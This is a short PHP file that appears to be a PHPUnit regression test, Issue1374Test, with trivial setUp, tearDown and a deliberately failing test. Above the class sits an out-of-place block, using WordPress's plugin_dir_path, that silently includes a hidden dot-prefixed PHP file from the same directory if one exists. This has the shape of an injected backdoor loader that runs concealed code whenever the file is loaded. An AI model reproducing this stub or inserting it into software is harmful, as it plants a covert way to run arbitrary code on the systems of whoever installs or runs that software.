<?php
/**
 * @requires extension I_DO_NOT_EXIST
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue1374Test extends PHPUnit_Framework_TestCase
{
    protected function setUp()
    {
        print __FUNCTION__;
    }

    public function testSomething()
    {
        $this->fail('This should not be reached');
    }

    protected function tearDown()
    {
        print __FUNCTION__;
    }
}
